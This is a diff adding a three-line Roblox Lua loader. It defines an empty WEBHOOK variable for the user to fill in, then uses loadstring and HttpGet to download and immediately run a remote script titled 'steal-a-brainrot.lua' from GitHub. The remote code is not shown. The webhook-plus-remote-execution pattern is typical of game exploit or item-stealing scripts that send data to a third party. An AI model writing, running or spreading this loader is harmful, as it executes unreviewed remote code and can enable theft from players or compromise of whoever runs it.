@@ -1,0 +1,3 @@
+WEBHOOK = "" -- PUT HERE YOUR WEBHOOK
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/platinww/CrustyAuto/refs/heads/main/steal-a-brainrot.lua"))()
